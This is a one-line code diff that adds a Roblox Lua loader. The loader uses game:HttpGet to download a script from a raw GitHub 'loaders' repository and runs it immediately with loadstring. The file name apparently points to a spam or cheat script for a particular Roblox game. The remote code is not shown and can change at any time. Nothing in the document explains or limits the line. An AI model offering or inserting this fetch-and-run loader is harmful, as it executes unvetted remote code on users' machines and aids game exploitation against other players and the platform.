@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/bunker-vs-verity-spam3-rh03fp4cixk4y4.lua"))()
